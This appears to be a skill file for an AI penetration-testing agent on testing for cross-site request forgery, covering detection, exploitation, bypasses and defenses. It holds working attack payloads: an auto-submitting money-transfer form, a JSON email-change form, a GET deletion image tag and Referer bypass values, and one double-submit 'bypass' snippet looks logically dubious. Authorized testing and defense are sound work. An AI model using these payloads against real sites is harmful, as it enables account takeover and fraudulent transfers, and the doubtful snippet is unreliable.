---
name: csrf-testing
description: Professional skills and methodology for CSRF cross-site request forgery testing
version: 1.0.0
---

# CSRF Cross-Site Request Forgery Testing

## Overview

CSRF (Cross-Site Request Forgery) is an attack that abuses a user's logged-in state to perform unauthorized actions. This skill provides detection, exploitation, and protection methods for CSRF vulnerabilities.

## Vulnerability Principle

- The attacker lures the user into visiting a malicious page
- The malicious page automatically sends a request to the target site
- The browser automatically includes the user's authentication (Cookie, Session)
- The target site mistakes it for a legitimate user action

## Testing Method

### 1. Identify Sensitive Actions

- Password change
- Email change
- Transfer operations
- Privilege changes
- Data deletion
- State updates

### 2. Detect the CSRF Token

**Check whether there is token protection:**
```html
<!-- Has token protection -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- No token protection - CSRF risk -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. Verify Token Validity

**Test whether the token is predictable:**
- Is the token based on a timestamp
- Is the token based on the user ID
- Is the token reusable
- Is the token shared across multiple requests

### 4. Check Referer Validation

**Test whether the Referer check can be bypassed:**
```javascript
// Normal request
Referer: https://target.com/change-password

// Test bypass
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (empty)
```

## Exploitation Techniques

### Basic CSRF Attack

**Auto-submitting HTML form:**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**Bypass the Content-Type check:**
```html
<!-- Submit JSON via a form -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### GET Request CSRF

**Attack using a GET request:**
```html
<img src="https://target.com/api/delete?id=123">
```

## Bypass Techniques

### Token Bypass

**If the token is in a Cookie:**
```javascript
// If the token exists in both the Cookie and the form
// try submitting only the token in the Cookie
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // No csrf_token parameter, relying on the Cookie
});
```

### SameSite Cookie Bypass

**Using a subdomain:**
- If SameSite=Lax, GET requests can still carry the Cookie
- Attack using a subdomain

### Double-Submit Cookie

**Bypass token validation:**
```html
<!-- If the token is in a Cookie and the validation logic is flawed -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // Read the token from the Cookie
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value = 
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## Tool Usage

### Burp Suite

**Use the CSRF PoC generator:**
1. Intercept the target request
2. Right-click → Engagement tools → Generate CSRF PoC
3. Test the generated PoC

### OWASP ZAP

```bash
# Use ZAP for a CSRF scan
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## Verification and Reporting

### Verification Steps

1. Confirm the target action has no CSRF token protection
2. Craft a malicious request and verify it executes
3. Assess the impact (data leakage, privilege escalation, financial loss, etc.)
4. Record a complete PoC
5. Enter the confirmed vulnerability into the platform via the `report_finding` tool (the only entry point for recording vulnerabilities on this platform), with fields covering location, type, severity, reproduction steps / PoC and remediation advice

### Reporting Points

- Vulnerability location and affected action
- Attack scenario and impact scope
- Complete exploitation steps and PoC
- Remediation advice (CSRF token, SameSite cookie, Referer validation, etc.)

## Protective Measures

### Recommended Approach

1. **CSRF Token**
   - Each form includes a unique token
   - The token is stored in the session
   - Validate the token's validity

2. **SameSite Cookie**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **Double-Submit Cookie**
   - The token exists in both the Cookie and the form
   - Verify that the two match

4. **Referer Validation**
   - Verify the Referer is same-origin
   - Mind the handling of an empty Referer

## Notes

- Perform only in an authorized test environment
- Avoid causing real impact to user accounts
- Record all testing steps
- Consider behavioral differences between browsers
